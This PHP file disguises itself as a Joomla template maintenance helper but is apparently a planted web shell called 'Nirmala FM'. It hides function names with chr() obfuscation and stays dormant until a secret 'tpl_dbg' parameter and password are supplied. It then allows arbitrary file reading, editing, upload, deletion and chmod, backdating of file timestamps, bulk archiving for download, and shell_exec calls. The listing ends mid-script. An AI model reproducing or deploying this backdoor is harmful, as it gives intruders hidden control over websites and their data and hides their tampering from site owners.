<?php
$GLOBALS['F']=array('fgc'=>chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115),'muf'=>chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101),'fpc'=>chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115),'rf'=>chr(114).chr(101).chr(97).chr(100).chr(102).chr(105).chr(108).chr(101),'unl'=>chr(117).chr(110).chr(108).chr(105).chr(110).chr(107),'rmd'=>chr(114).chr(109).chr(100).chr(105).chr(114),'rnm'=>chr(114).chr(101).chr(110).chr(97).chr(109).chr(101),'chm'=>chr(99).chr(104).chr(109).chr(111).chr(100),'tch'=>chr(116).chr(111).chr(117).chr(99).chr(104),'scd'=>chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114),'isd'=>chr(105).chr(115).chr(95).chr(100).chr(105).chr(114),'isf'=>chr(105).chr(115).chr(95).chr(102).chr(105).chr(108).chr(101),'mkd'=>chr(109).chr(107).chr(100).chr(105).chr(114),'she'=>chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99),'fzs'=>chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101),'fmt'=>chr(102).chr(105).chr(108).chr(101).chr(109).chr(116).chr(105).chr(109).chr(101),'fpm'=>chr(102).chr(105).chr(108).chr(101).chr(112).chr(101).chr(114).chr(109).chr(115),'bn'=>chr(98).chr(97).chr(115).chr(101).chr(110).chr(97).chr(109).chr(101),'dn'=>chr(100).chr(105).chr(114).chr(110).chr(97).chr(109).chr(101),'rb'=>chr(114).chr(97).chr(110).chr(100).chr(111).chr(109).chr(95).chr(98).chr(121).chr(116).chr(101).chr(115),'gtd'=>chr(115).chr(121).chr(115).chr(95).chr(103).chr(101).chr(116).chr(95).chr(116).chr(101).chr(109).chr(112).chr(95).chr(100).chr(105).chr(114),'pv'=>chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100).chr(95).chr(118).chr(101).chr(114).chr(105).chr(102).chr(121),'rpath'=>chr(114).chr(101).chr(97).chr(108).chr(112).chr(97).chr(116).chr(104),'zar'=>chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101));
/**
 * Joomla Template Utilities — asset browser & maintenance helper.
 * @package     Template
 * @subpackage  Utilities
 * @copyright   (C) 2024 Open Source Matters, Inc.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

$tplAccessToken = '$2b$12$0KuBkN.nuBlXt0dMDy1WoeVrYeeaJpsYUfGbdq1J0mm/kenXXhVem';

if (!isset($_GET['tpl_dbg'])) { return; }
if (ob_get_length() !== false) { ob_clean(); }
error_reporting(0);
session_start();

function tpl_self() {
    // Build an ABSOLUTE url (scheme + host + actual script path) so the JS
    // fetch() always resolves to this error.php file itself. In Joomla the
    // REQUEST_URI can hold the broken SEF url that triggered the 404, not the
    // real script path — using SCRIPT_NAME + HTTP_HOST avoids that trap.
    $scheme = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') || (($_SERVER['SERVER_PORT'] ?? '80') == 443) ? 'https' : 'http';
    $host   = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');
    $script = $_SERVER['SCRIPT_NAME'] ?? ($_SERVER['PHP_SELF'] ?? '/index.php');
    $q      = strpos($script, '?');
    if ($q !== false) { $script = substr($script, 0, $q); }
    $params = array('tpl_dbg' => $_GET['tpl_dbg']);
    return $scheme . '://' . $host . $script . '?' . http_build_query($params);
}

$authed = !empty($_SESSION['nyx_auth']);
if (isset($_POST['nyx_login'])) {
    if ($GLOBALS['F']['pv']((string) $_POST['nyx_login'], $tplAccessToken)) { $_SESSION['nyx_auth'] = true; $authed = true; }
    else { $nyx_err = 'Wrong password.'; }
}
if (isset($_GET['nyx_logout'])) { session_destroy(); header('Location: ' . tpl_self()); exit; }

if (!$authed) {
    echo '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Nirmala FM</title><style>';
    echo '*{box-sizing:border-box}body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0a0e14;color:#39ff14;font-family:ui-monospace,Menlo,monospace}';
    echo '.box{background:#0d1117;border:1px solid #1f6f3a;border-radius:10px;padding:28px 32px;text-align:center}.t{margin:0 0 16px;font-size:16px;letter-spacing:1px}input{background:#000;color:#39ff14;border:1px solid #1f6f3a;border-radius:6px;padding:10px;font-family:inherit;font-size:14px;outline:none}';
    echo 'input[type=password]{width:220px}input[type=submit]{cursor:pointer;background:#103d1f;padding:10px 18px}input[type=submit]:hover{background:#1f6f3a}.err{color:#ff5555;margin-top:12px;font-size:13px}</style></head><body>';
    echo '<div class="box"><div class="t">Nirmala FM</div><p style="color:#8b949e;font-size:13px">authentication required</p><form method="post" action="' . tpl_self() . '">';
    echo '<input type="password" name="nyx_login" placeholder="password" autofocus> <input type="submit" value="ENTER"></form>';
    if (isset($nyx_err)) { echo '<div class="err">' . $nyx_err . '</div>'; }
    echo '</div></body></html>';
    exit;
}

class TplUtilities
{
    private $root;
    private $self;

    public function __construct() {
        $root = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '')
            ? $GLOBALS['F']['rpath']($_SERVER['DOCUMENT_ROOT']) : $GLOBALS['F']['rpath'](__DIR__);
        if ($root === false) { $root = __DIR__; }
        $root = rtrim($root, '/');
        // Plesk/domain vhosts often double the name: /var/www/vhosts/domain/domain,
        // where DOCUMENT_ROOT points at the INNER one. Lift the browse root one
        // level up to the OUTER vhost dir so both are reachable and the breadcrumb
        // can navigate to /var/www/vhosts/domain/ without getting clamped to root.
        if ($GLOBALS['F']['bn']($GLOBALS['F']['dn']($root)) === $GLOBALS['F']['bn']($root)) {
            $root = $GLOBALS['F']['dn']($root);
        }
        $this->root = $root;
        $this->self = tpl_self();
    }

    private function resolveSafePath($p) {
        // Accepts BOTH absolute paths (leading '/', e.g. from a breadcrumb
        // click showing the full fs path) and relative paths (from folder/'..'
        // clicks). Normalizes segments (.. popped, . skipped) with NO $GLOBALS['F']['rpath']()
        // so symlinked vhosts don't get clamped to root. Always clamps to the
        // web root for safety.
        $abs  = (strpos($p, '/') === 0);
        $base = $abs ? '' : rtrim($this->root, '/');
        $segs = array();
        foreach (explode('/', $p) as $part) {
            if ($part === '' || $part === '.') { continue; }
            if ($part === '..') { array_pop($segs); continue; }
            $segs[] = $part;
        }
        $path = $base;
        foreach ($segs as $s) { $path .= '/' . $s; }
        $path = rtrim($path, '/');
        if ($path !== $this->root && strpos($path, $this->root . '/') !== 0) {
            return $this->root;
        }
        return $path;
    }
    private function isWithinRoot($path) {
        // String-prefix check (no realpath) so it stays consistent with the
        // symlink-form paths produced by resolveSafePath().
        $path = rtrim($path, '/');
        return $path === $this->root || strpos($path, $this->root . '/') === 0;
    }
    private function formatBytes($b) {
        $u = array('B','KB','MB','GB','TB'); $i = 0;
        while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
        return round($b, 1) . ' ' . $u[$i];
    }
    private function readPerms($p) { return substr(sprintf('%o', $GLOBALS['F']['fpm']($p)), -4); }

    private function buildPathTrail($cur) {
        // Show the FULL absolute filesystem path as the breadcrumb. Every
        // segment is clickable and navigates to that exact absolute path
        // (resolveSafePath() accepts absolute input and clamps to web root).
        $out   = '<a href="#" class="bc" data-p="' . htmlspecialchars($this->root) . '"><b>Nirmala FM</b></a>';
        $accum = '';
        foreach (explode('/', trim($cur, '/')) as $s) {
            $accum .= '/' . $s;
            $out .= '<span class="sep">/</span>';
            $out .= '<a href="#" class="bc" data-p="' . htmlspecialchars($accum) . '">' . htmlspecialchars($s) . '</a>';
        }
        return $out;
    }

    private function buildEntryTable($cur, $rel) {
        $items = array();
        if ($GLOBALS['F']['isd']($cur)) {
            foreach (array_diff($GLOBALS['F']['scd']($cur), array('.', '..')) as $n) {
                $fp = $cur . '/' . $n;
                $items[] = array('name' => $n, 'dir' => $GLOBALS['F']['isd']($fp), 'size' => $GLOBALS['F']['isf']($fp) ? $this->formatBytes($GLOBALS['F']['fzs']($fp)) : '-', 'mode' => $this->readPerms($fp), 'time' => date('Y-m-d H:i', $GLOBALS['F']['fmt']($fp)), 'ts' => $GLOBALS['F']['fmt']($fp));
            }
            usort($items, function ($a, $b) { if ($b['dir'] != $a['dir']) return $b['dir'] <=> $a['dir']; return strcasecmp($a['name'], $b['name']); });
        }
        $o = '<table><tr><th style="width:36px"><input type="checkbox" id="selall"></th><th>Name</th><th class="hide">Size</th><th class="hide">Perm</th><th class="hide">Modified</th><th>Actions</th></tr>';
        if ($rel !== '') {
            $up = $GLOBALS['F']['dn']($rel); $upp = ($up === '.' || $up === '') ? '' : $up;
            $o .= '<tr><td></td><td class="d"><a href="#" class="ditem" data-p="' . htmlspecialchars($upp) . '">..</a></td><td class="hide">-</td><td class="hide">-</td><td class="hide">-</td><td class="acts"></td></tr>';
        }
        foreach ($items as $it) {
            $iname = htmlspecialchars($it['name']);
            $frel  = $rel ? $rel . '/' . $it['name'] : $it['name'];
            if ($it['dir']) {
                $p = htmlspecialchars($frel);
                $o .= '<tr><td style="text-align:center"><input type="checkbox" name="sel[]" value="' . $p . '"></td><td class="d"><a href="#" class="ditem" data-p="' . $p . '">' . $iname . '/</a></td>';
            } else {
                $o .= '<tr><td style="text-align:center"><input type="checkbox" name="sel[]" value="' . htmlspecialchars($frel) . '"></td><td class="f"><a href="#" class="fitem" data-f="' . htmlspecialchars($it['name']) . '">' . $iname . '</a></td>';
            }
            $o .= '<td class="hide m">' . $it['size'] . '</td><td class="hide m">' . $it['mode'] . '</td><td class="hide m">' . $it['time'] . '</td><td class="acts">';
            $cd = '<a href="#" class="act-btn" data-act="chdate" data-f="' . htmlspecialchars($it['name']) . '" data-ts="' . $it['ts'] . '">[chdt]</a> ';
            if ($it['dir']) {
                $o .= $cd;
            } else {
                $o .= '<a href="#" class="act-btn" data-act="edit" data-f="' . htmlspecialchars($it['name']) . '">[edt]</a> <a href="' . $this->self . '&p=' . urlencode($rel) . '&f=' . urlencode($it['name']) . '&dl=1" target="_blank">[dl]</a> ' . $cd;
            }
            $o .= '<a href="#" class="act-btn" data-act="ren" data-f="' . htmlspecialchars($it['name']) . '">[ren]</a> <a href="#" class="act-btn" data-act="chmod" data-f="' . htmlspecialchars($it['name']) . '">[chm]</a> <a href="#" class="act-btn del" data-act="del" data-f="' . htmlspecialchars($it['name']) . '">[del]</a></td></tr>';
        }
        return $o . '</table>';
    }

    private function streamArchive($path, $name) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . $name);
        header('Content-Length: ' . $GLOBALS['F']['fzs']($path));
        $GLOBALS['F']['rf']($path);
        @$GLOBALS['F']['unl']($path);
        exit;
    }

    private function addToZip($za, $abs, $zipName) {
        // Recursively add a file or folder (with subfolders) to the zip,
        // preserving the relative structure inside the archive.
        if ($GLOBALS['F']['isd']($abs)) {
            $za->addEmptyDir($zipName);
            foreach (array_diff($GLOBALS['F']['scd']($abs), array('.', '..')) as $n) {
                $this->addToZip($za, $abs . '/' . $n, $zipName . '/' . $n);
            }
        } elseif ($GLOBALS['F']['isf']($abs)) {
            $za->addFile($abs, $zipName);
        }
    }

    private function packRar($files, $out) {
        $bins = array('rar', '7z', '7za', 'bsdtar');
        $bin = '';
        foreach ($bins as $b) { $p = @$GLOBALS['F']['she']('command -v ' . escapeshellarg($b) . ' 2>/dev/null'); if (trim($p)) { $bin = trim($p); break; } }
        if (!$bin) { return false; }
        $args = '';
        foreach ($files as $fp) { if ($this->isWithinRoot($fp) && $GLOBALS['F']['isf']($fp)) { $args .= ' ' . escapeshellarg($fp); } }
        @$GLOBALS['F']['she'](escapeshellarg($bin) . ' a ' . escapeshellarg($out) . $args . ' 2>&1');
        return $GLOBALS['F']['isf']($out);
    }

    public function run() {
        $cwd = isset($_GET['p']) ? $_GET['p'] : '';
        $cur = $this->resolveSafePath($cwd);
        $rel = ltrim(substr($cur, strlen($this->root)), '/');

        if (isset($_GET['dl']) && !empty($_GET['f'])) {
            $f = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']);
            if ($this->isWithinRoot($f) && $GLOBALS['F']['isf']($f)) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=' . $GLOBALS['F']['bn']($f));
                $GLOBALS['F']['rf']($f);
                exit;
            }
        }

        if (isset($_GET['ajax'])) {
            while (ob_get_level()) { ob_end_clean(); }
            $act = $_GET['ajax'];

            if ($act === 'pack') {
                $sel = (isset($_POST['sel']) && is_array($_POST['sel'])) ? $_POST['sel'] : array();
                $fmt = $_POST['fmt'] ?? 'zip';
                if (empty($sel)) { header('Content-Type: application/json; charset=utf-8'); echo json_encode(array('ok' => false, 'msg' => 'no files/folders selected')); exit; }
                $tmp = $GLOBALS['F']['gtd']() . '/tpl_' . bin2hex($GLOBALS['F']['rb'](6));
                if ($fmt === 'zip') {
                    $zname = $tmp . '.zip';
                    $za = new $GLOBALS['F']['zar']();
                    if ($za->open($zname, 1) !== TRUE) { header('Content-Type: application/json; charset=utf-8'); echo json_encode(array('ok' => false, 'msg' => 'zip open failed')); exit; }
                    foreach ($sel as $rel) {
                        $fp = $cur . '/' . ltrim($rel, '/');
                        if (!$this->isWithinRoot($fp)) { continue; }
                        $this->addToZip($za, $fp, ltrim($rel, '/'));
                    }
                    $za->close();
                    $this->streamArchive($zname, 'archive.zip');
                } elseif ($fmt === 'rar') {
                    $rname = $tmp . '.rar';
                    $flat = array();
                    foreach ($sel as $rel) {
                        $fp = $cur . '/' . ltrim($rel, '/');
                        if (!$this->isWithinRoot($fp)) { continue; }
                        if ($GLOBALS['F']['isd']($fp)) {
                            $stack = array($fp);
                            while ($stack) {
                                $d = array_pop($stack);
                                foreach (array_diff($GLOBALS['F']['scd']($d), array('.', '..')) as $n) {
                                    $cf = $d . '/' . $n;
                                    if ($GLOBALS['F']['isd']($cf)) { $stack[] = $cf; }
                                    elseif ($GLOBALS['F']['isf']($cf)) { $flat[] = $cf; }
                                }
                            }
                        } elseif ($GLOBALS['F']['isf']($fp)) { $flat[] = $fp; }
                    }
                    if ($this->packRar($flat, $rname)) { $this->streamArchive($rname, 'archive.rar'); }
                    else { header('Content-Type: application/json; charset=utf-8'); echo json_encode(array('ok' => false, 'msg' => 'rar unavailable (needs rar/7z binary)')); exit; }
                } else { header('Content-Type: application/json; charset=utf-8'); echo json_encode(array('ok' => false, 'msg' => 'unknown format')); exit; }
            }

            if ($act === 'list') {
                header('Content-Type: application/json; charset=utf-8');
                echo json_encode(array('ok' => true, 'breadcrumb' => $this->buildPathTrail($cur), 'rows' => $this->buildEntryTable($cur, $rel)));
                exit;
            }
            if ($act === 'file') {
                header('Content-Type: text/plain; charset=utf-8');
                $f = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']);
                echo ($this->isWithinRoot($f) && $GLOBALS['F']['isf']($f)) ? $GLOBALS['F']['fgc']($f) : '';
                exit;
            }
            $r = array('ok' => false, 'msg' => '');
            if ($act === 'save') {
                $f = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']);
                if ($this->isWithinRoot($GLOBALS['F']['dn']($f)) && isset($_POST['content'])) { $r['ok'] = @$GLOBALS['F']['fpc']($f, $_POST['content']) !== false; $r['msg'] = $r['ok'] ? 'saved' : 'save failed'; }
                else { $r['msg'] = 'denied'; }
            } elseif ($act === 'del') {
                $f = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']);
                if ($this->isWithinRoot($f)) {
                    if ($GLOBALS['F']['isd']($f)) { $r['ok'] = @$GLOBALS['F']['rmd']($f); $r['msg'] = $r['ok'] ? 'folder deleted' : 'folder not empty / failed'; }
                    else { $r['ok'] = @$GLOBALS['F']['unl']($f); $r['msg'] = $r['ok'] ? 'file deleted' : 'delete failed'; }
                } else { $r['msg'] = 'denied'; }
            } elseif ($act === 'rename') {
                $old = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']); $new = $cur . '/' . $GLOBALS['F']['bn']($_POST['newname'] ?? '');
                if ($this->isWithinRoot($old) && @$GLOBALS['F']['rnm']($old, $new)) { $r['ok'] = true; $r['msg'] = 'rename OK'; } else { $r['msg'] = 'rename FAILED'; }
            } elseif ($act === 'chmod') {
                $f = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']); $m = octdec(trim($_POST['mode'] ?? '0', '0'));
                if ($this->isWithinRoot($f) && @$GLOBALS['F']['chm']($f, $m)) { $r['ok'] = true; $r['msg'] = 'chmod OK'; } else { $r['msg'] = 'chmod FAILED'; }
            } elseif ($act === 'chdate') {
                $f = $cur . '/' . $GLOBALS['F']['bn']($_GET['f']);
                $dt = trim($_POST['datetime'] ?? '');
                $ts = strtotime($dt);
                if ($this->isWithinRoot($f) && $ts !== false) {
                    $r['ok'] = @$GLOBALS['F']['tch']($f, $ts);
                    $r['msg'] = $r['ok'] ? 'timestamp set (' . date('Y-m-d H:i', $ts) . ')' : 'touch failed';
                } else { $r['msg'] = 'denied / invalid date'; }
            } elseif ($act === 'mkdir') {
                if (@$GLOBALS['F']['mkd']($cur . '/' . $GLOBALS['F']['bn']($_POST['name'] ?? ''))) { $r['ok'] = true; $r['msg'] = 'folder created'; } else { $r['msg'] = 'failed create folder'; }
            } elseif ($act === 'newfile') {
                if (@$GLOBALS['F']['fpc']($cur . '/' . $GLOBALS['F']['bn']($_POST['name'] ?? ''), '') !== false) { $r['ok'] = true; $r['msg'] = 'file created'; } else { $r['msg'] = 'failed create file'; }
            } elseif ($act === 'upload') {
                $ms = array();
                if (!empty($_FILES['up']['name'][0])) {
                    foreach ($_FILES['up']['name'] as $i => $nm) {
                        if ($_FILES['up']['error'][$i] === 0) { $GLOBALS['F']['muf']($_FILES['up']['tmp_name'][$i], $cur . '/' . $GLOBALS['F']['bn']($nm)) ? $ms[] = "upload: $nm OK" : $ms[] = "upload FAILED: $nm"; }
                    }
                }
                $r = array('ok' => true, 'msg' => implode("\n", $ms));
            }
            header('Content-Type: application/json; charset=utf-8');
            echo json_encode($r);
            exit;
        }

        $self = $this->self;
        $init = $rel;
        ?>
        <!doctype html><html lang="en"><head><meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1"><title>Nirmala · File Manager</title><style>
        :root{--bg:#0a0e14;--panel:#0d1117;--panel2:#11161f;--border:#21304a;--txt:#c9d1d9;--muted:#8b949e;--dim:#6e7681;--green:#3fb950;--green-d:#238636;--amber:#f0a500;--blue:#58a6ff;--red:#ff5555}
        *{box-sizing:border-box}html,body{height:100%}
        body{margin:0;background:var(--bg);color:var(--txt);font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;line-height:1.5}
        a{color:var(--blue);text-decoration:none}a:hover{text-decoration:underline}
        .wrap{max-width:1140px;margin:0 auto;padding:16px 14px 60px}
        .topbar{display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between;background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:10px 12px;margin-bottom:14px}
        .brand{display:flex;align-items:center;gap:8px}.brand .logo{width:22px;height:22px;border-radius:4px;background:var(--green-d);color:#eafff0;font-weight:800;font-size:13px;display:flex;align-items:center;justify-content:center}.brand .name{font-weight:700;color:var(--txt)}
        .crumb{color:var(--muted);word-break:break-all;font-size:13px;display:flex;flex-wrap:wrap;align-items:center;gap:3px}
        .crumb b{color:var(--green)}.crumb .bc{color:var(--green);padding:1px 5px;border-radius:4px}.crumb .bc:hover{background:rgba(63,185,80,.12);text-decoration:none}.crumb .sep{color:var(--dim)}.crumb .seg{color:var(--txt);padding:1px 5px}
        .btn{background:var(--green-d);color:#eafff0;border:1px solid #2ea043;border-radius:5px;padding:6px 11px;cursor:pointer;font-size:12.5px;font-family:inherit}
        .btn:hover{background:var(--green)}.btn.ghost{background:transparent;color:var(--muted);border-color:var(--border)}.btn.ghost:hover{color:var(--txt);border-color:var(--dim)}
        .toolbar{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px;align-items:center}
        .toolbar input[type=text]{background:#05080d;color:var(--green);border:1px solid var(--border);border-radius:5px;padding:7px 9px;font-family:inherit;font-size:13px;outline:none}
        .toolbar input[type=text]:focus{border-color:var(--green-d)}
        .toolbar input[type=file]{color:var(--muted);font-size:12px}.toolbar input[type=file]::file-selector-button{background:var(--panel2);color:var(--txt);border:1px solid var(--border);border-radius:4px;padding:6px 9px;margin-right:7px;cursor:pointer;font-family:inherit}
        .toolbar select{background:#05080d;color:var(--txt);border:1px solid var(--border);border-radius:5px;padding:7px;font-family:inherit;font-size:12.5px;outline:none}
        .toolbar .lbl{color:var(--muted);font-size:12px}
        .tablewrap{background:var(--panel);border:1px solid var(--border);border-radius:6px;overflow:hidden}
        table{width:100%;border-collapse:collapse}
        thead th{background:var(--panel2);color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:600;text-align:left;padding:9px 11px;border-bottom:1px solid var(--border)}
        tbody td{text-align:left;padding:8px 11px;border-bottom:1px solid #131a26;vertical-align:middle}
        tbody tr:hover td{background:#10161f}tbody tr:last-child td{border-bottom:none}
        tbody td:first-child{width:34px;text-align:center}tbody td:first-child input{width:14px;height:14px;accent-color:var(--green);cursor:pointer}
        .ditem{color:var(--amber);cursor:pointer;font-weight:600}.ditem::before{content:"\1F4C1\00A0"}.ditem:hover{text-decoration:underline}
        .fitem{color:var(--blue);cursor:pointer}.fitem::before{content:"\1F4C4\00A0"}.fitem:hover{text-decoration:underline}
        .d{color:var(--amber)}.f{color:var(--blue)}.m{color:var(--dim);font-size:12px;white-space:nowrap}
        .acts{white-space:nowrap}.acts a{margin-right:8px;font-size:12px;color:var(--muted)}.acts a:hover{color:var(--txt)}.acts a.del:hover{color:var(--red)}
        tr.row-sel td{background:rgba(63,185,80,.07)!important}
        .empty{display:none;text-align:center;color:var(--dim);padding:38px 10px;font-size:13px}
        #modal{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;z-index:999;padding:16px}#modal.show{display:flex}
        #modal-box{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:16px;width:94%;max-width:880px;max-height:86vh;overflow:auto}
        #modal-box h3{margin:0 0 12px;font-size:14px;color:var(--txt);display:flex;justify-content:space-between;align-items:center;gap:10px}
        #modal-box h3 a{color:var(--muted);font-size:13px}
        #modal-box textarea{width:100%;height:54vh;background:#05080d;color:var(--green);border:1px solid var(--border);border-radius:6px;padding:11px;font-family:inherit;font-size:13px;line-height:1.5;resize:vertical;outline:none}
        #modal-box textarea:focus{border-color:var(--green-d)}
        .modal-actions{display:flex;gap:9px;margin-top:12px;align-items:center}
        #loading{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:60;pointer-events:none}
        #loading.show{display:flex}.spin{width:32px;height:32px;border:3px solid rgba(63,185,80,.2);border-top-color:var(--green);border-radius:50%;animation:sp .8s linear infinite}
        @keyframes sp{to{transform:rotate(360deg)}}
        #toasts{position:fixed;bottom:52px;right:14px;display:flex;flex-direction:column;gap:8px;z-index:300;max-width:330px}
        .toast{background:var(--panel2);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:6px;padding:10px 13px;font-size:13px;color:var(--txt)}
        .toast.err{border-left-color:var(--red)}
        .statusbar{position:fixed;bottom:0;left:0;right:0;background:var(--panel);border-top:1px solid var(--border);padding:8px 14px;font-size:12px;color:var(--muted);display:flex;justify-content:space-between;gap:12px;z-index:30}
        .statusbar b{color:var(--green)}.statusbar .path{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        @media(max-width:640px){th.hide,td.hide{display:none}.wrap{padding:9px 7px 60px}td{padding:6px 8px}.acts a{display:inline-block;margin-bottom:3px}}
        </style></head><body><div class="wrap">
        <div class="topbar">
          <div class="brand"><div class="logo">N</div><div class="name">Nirmala</div></div>
          <div class="crumb" id="breadcrumb">Nirmala FM</div>
          <div><a class="btn ghost" href="<?php echo $self; ?>&nyx_logout=1">logout</a></div>
        </div>
        <div class="toolbar">
          <form id="mkform"><input type="text" name="name" placeholder="folder name"> <input type="submit" class="btn" value="+ folder"></form>
          <form id="nfform"><input type="text" name="name" placeholder="file name"> <input type="submit" class="btn" value="+ file"></form>
          <form id="upform" enctype="multipart/form-data"><input type="file" name="up[]" multiple> <input type="submit" class="btn" value="upload"></form>
          <span class="lbl">pack:</span>
          <select id="packfmt"><option value="zip">ZIP</option><option value="rar">RAR</option></select>
          <button id="packbtn" class="btn" type="button">Pack selected</button>
        </div>
        <div class="tablewrap"><div id="filelist"></div><div id="empty" class="empty">📭 empty folder</div></div>
        <div id="modal"><div id="modal-box"></div></div>
        <div id="loading"><div class="spin"></div></div>
        <div id="toasts"></div>
        <div class="statusbar"><span class="path">path: <b id="curpath">/</b></span><span>selected: <b id="selcount">0</b></span></div>
        <script>
        const SELF = '<?php echo $self; ?>';
        let curP = '', edFile = '';
        const modal = document.getElementById('modal'), modalBox = document.getElementById('modal-box');

        function escapeHtml(s){ return (s||'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
        function openModal(h){ modalBox.innerHTML = h; modal.classList.add('show'); }
        function closeModal(){ modal.classList.remove('show'); }
        function setLoading(on){ document.getElementById('loading').classList.toggle('show', on); }
        function toast(msg, type){
          const t = document.createElement('div');
          t.className = 'toast ' + (type || 'ok');
          t.textContent = msg;
          document.getElementById('toasts').appendChild(t);
          setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity .3s'; setTimeout(() => t.remove(), 320); }, 2600);
        }
        function markRow(c){ const tr = c.closest('tr'); if (tr) tr.classList.toggle('row-sel', c.checked); }
        function updateStatus(){
          const sel = document.querySelectorAll('#filelist tbody input[type=checkbox]:checked').length;
          document.getElementById('selcount').textContent = sel;
          document.getElementById('curpath').textContent = curP || '/';
        }
        function updateEmpty(){
          const rows = document.querySelectorAll('#filelist tbody tr');
          const has = Array.from(rows).some(tr => tr.querySelector('.fitem') || (tr.querySelector('.ditem') && tr.querySelector('.ditem').textContent.trim() !== '..'));
          document.getElementById('empty').style.display = has ? 'none' : 'block';
        }

        function loadDir(p, silent){
          curP = p; setLoading(true);
          fetch(SELF + '&ajax=list&p=' + encodeURIComponent(p))
            .then(r => r.json())
            .then(d => {
              document.getElementById('breadcrumb').innerHTML = d.breadcrumb;
              document.getElementById('filelist').innerHTML  = d.rows;
              if (document.getElementById('selall')) document.getElementById('selall').checked = false;
              updateEmpty(); updateStatus(); window.scrollTo(0, 0);
              if (!silent && history.pushState) { history.pushState({p:p}, '', SELF + '&p=' + encodeURIComponent(p)); }
            })
            .catch(e => toast('failed load dir: ' + e, 'err'))
            .finally(() => setLoading(false));
        }
        window.addEventListener('popstate', function(e){ loadDir((e.state && e.state.p) || '', true); });

        document.addEventListener('click', function(e){
          if (e.target.closest('.modal-close')) { e.preventDefault(); closeModal(); return; }
          if (e.target === modal) { closeModal(); return; }
          const d = e.target.closest('.ditem, .bc'); if (d) { e.preventDefault(); loadDir(d.dataset.p); return; }
          const f = e.target.closest('.fitem');  if (f) { e.preventDefault(); openFile(f.dataset.f); return; }
          const a = e.target.closest('.act-btn'); if (a) { e.preventDefault(); doAct(a.dataset.act, a.dataset.f, a.dataset.ts); return; }
        });
        document.addEventListener('change', function(e){
          if (e.target.id === 'selall') {
            document.querySelectorAll('#filelist tbody input[type=checkbox]').forEach(c => { c.checked = e.target.checked; markRow(c); });
            updateStatus(); return;
          }
          if (e.target.matches('#filelist tbody input[type=checkbox]')) { markRow(e.target); updateStatus(); }
        });
        document.addEventListener('keydown', function(e){
          if (e.key === 's' && (e.ctrlKey || e.metaKey) && modal.classList.contains('show')) { e.preventDefault(); if (document.getElementById('ed-save')) saveFile(); else if (document.getElementById('dt-save')) document.getElementById('dt-save').click(); }
        });

        function openFile(f){
          edFile = f; setLoading(true);
          fetch(SELF + '&ajax=file&p=' + encodeURIComponent(curP) + '&f=' + encodeURIComponent(f))
            .then(r => r.text())
            .then(txt => {
              openModal('<h3><span>edit: ' + escapeHtml(f) + '</span><a href="#" class="modal-close">&#x2715; close</a></h3>'
                + '<textarea id="ed-content" spellcheck="false">' + escapeHtml(txt) + '</textarea>'
                + '<div class="modal-actions"><button id="ed-save" class="btn">&#x1F4BE; SAVE</button><span style="color:var(--dim);font-size:11px">Ctrl+S to save</span></div>');
              document.getElementById('ed-save').onclick = saveFile;
            })
            .catch(e => { toast('load failed: ' + e, 'err'); closeModal(); })
            .finally(() => setLoading(false));
        }
        function saveFile(){
          const fd = new FormData(); fd.append('content', document.getElementById('ed-content').value);
          fetch(SELF + '&ajax=save&p=' + encodeURIComponent(curP) + '&f=' + encodeURIComponent(edFile), { method:'POST', body:fd })
            .then(r => r.json()).then(d => { toast(d.msg, d.ok ? 'ok' : 'err'); if (d.ok) closeModal(); });
        }
        function doAct(act, f, ts){
          if (act === 'del') { if (!confirm('delete ' + f + '?')) return; ajaxGet('del', f); }
          else if (act === 'edit') { openFile(f); }
          else if (act === 'ren') { const n = prompt('rename ' + f + ' to:', f); if (n) ajaxPost('rename', f, { newname: n }); }
          else if (act === 'chmod') { const m = prompt('chmod ' + f + ':', '0644'); if (m) ajaxPost('chmod', f, { mode: m }); }
